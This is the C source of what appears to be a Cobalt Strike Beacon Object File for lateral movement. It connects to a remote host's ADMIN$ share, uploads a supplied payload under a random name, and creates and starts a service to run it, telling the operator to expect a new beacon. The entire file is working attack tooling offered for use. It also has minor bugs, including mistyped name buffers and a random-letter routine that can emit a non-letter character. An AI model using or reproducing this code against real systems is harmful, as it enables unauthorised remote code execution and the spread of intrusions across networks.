#include <windows.h>
#include <stdio.h>
#include "../_include/beacon.h"

WINBASEAPI DWORD WINAPI MPR$WNetAddConnection2A(LPNETRESOURCEA lpNetResource, LPCSTR lpPassword, LPCSTR lpUserName, DWORD dwFlags);
WINBASEAPI int __cdecl MSVCRT$_snprintf(char * __restrict__ d, size_t n, const char * __restrict__ format, ...);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped );
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR lpMachineName,LPCSTR lpDatabaseName,DWORD dwDesiredAccess);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$CreateServiceA(SC_HANDLE hSCManager,LPCSTR lpServiceName,LPCSTR lpDisplayName,DWORD dwDesiredAccess,DWORD dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCSTR lpBinaryPathName,LPCSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCSTR lpDependencies,LPCSTR lpServiceStartName,LPCSTR lpPassword);
WINADVAPI WINBOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE hSCObject);
WINADVAPI WINBOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE hService,DWORD dwNumServiceArgs,LPCSTR *lpServiceArgVectors);

typedef BOOLEAN(WINAPI *RTLGENRANDOM)(PVOID, ULONG);

void generateRandomString(char *buffer, int length)
{
    unsigned char randomBytes[256];

    RTLGENRANDOM pRtlGenRandom = (RTLGENRANDOM)GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction036");
    if (!pRtlGenRandom || !pRtlGenRandom(randomBytes, 256))
    {
        BeaconPrintf(CALLBACK_ERROR, "RtlGenRandom failed");
        return;
    }

    for (int i = 0; i < length; i++)
    {
        unsigned char val = randomBytes[i] % 27;
        buffer[i] = 'A' + val;
    }
    buffer[length] = '\0';
}

void go(char *args, int len)
{
    // Parse arguments
    datap parser;
    BeaconDataParse(&parser, args, len);

    CHAR* target = BeaconDataExtract(&parser, NULL);

    ULONG svcBinarySize;
    CHAR* svcBinary = BeaconDataExtract(&parser, &svcBinarySize);

    // 1. Connect to ADMIN$ share
    CHAR remoteName[MAX_PATH];
    MSVCRT$_snprintf(remoteName, sizeof(remoteName), "\\\\%s\\ADMIN$", target);

    NETRESOURCEA nr = {NULL, RESOURCETYPE_DISK, NULL, NULL, NULL, remoteName, NULL, NULL};
    if (MPR$WNetAddConnection2A(&nr, NULL, NULL, 0) != NO_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "Connection failed: %lu\n", KERNEL32$GetLastError());
        return;
    }

    // 2. Copy local payload to remote ADMIN$ (C:\Windows\Temp.exe)
    CHAR remotePath[MAX_PATH];
    char binaryName[6];
    generateRandomString(binaryName, 5);
    MSVCRT$_snprintf(remotePath, sizeof(remotePath), "\\\\%s\\ADMIN$\\%s.exe", target, binaryName);
    BeaconPrintf(CALLBACK_OUTPUT, "Writing service binary to %s\n", remotePath);

    HANDLE hFile = KERNEL32$CreateFileA(remotePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFileA failed: %lu", KERNEL32$GetLastError());
        return;
    }

    DWORD bytesWritten;
    if (!KERNEL32$WriteFile(hFile, svcBinary, svcBinarySize, &bytesWritten, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteFile failed: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hFile);
        return;
    }
    KERNEL32$CloseHandle(hFile);

    // 3. Create and start service
    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerA(target, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_ERROR, "OpenSCManagerA failed: %lu", KERNEL32$GetLastError());
        return;
    }

    CHAR* serviceName[9];
    CHAR* displayName[13];

    generateRandomString(serviceName, 8);
    generateRandomString(displayName, 12);

    if (!serviceName || !displayName) {
        BeaconPrintf(CALLBACK_ERROR, "Name generation failed");
        return;
    }

    char payloadPath[MAX_PATH];
    MSVCRT$_snprintf(payloadPath, sizeof(payloadPath), "C:\\Windows\\%s.exe", binaryName);

    SC_HANDLE hSvc = ADVAPI32$CreateServiceA( hSCM, serviceName, displayName, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payloadPath, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc) {
        BeaconPrintf(CALLBACK_ERROR, "CreateServiceA failed: %lu", KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(hSCM);
        return;
    }

    if (!ADVAPI32$StartServiceA(hSvc, 0, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "StartServiceA failed: %lu", KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(hSvc);
        ADVAPI32$CloseServiceHandle(hSCM);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Service started, you should receive a beacon now");

    // 4. Cleanup
    // pDeleteService(hSvc);
    // ADVAPI32$CloseServiceHandle(hSvc);
    // ADVAPI32$CloseServiceHandle(hSCM);
    // pDeleteFileA(remotePath);
    // pWNetCancelConnection2A(target, 0, TRUE);
}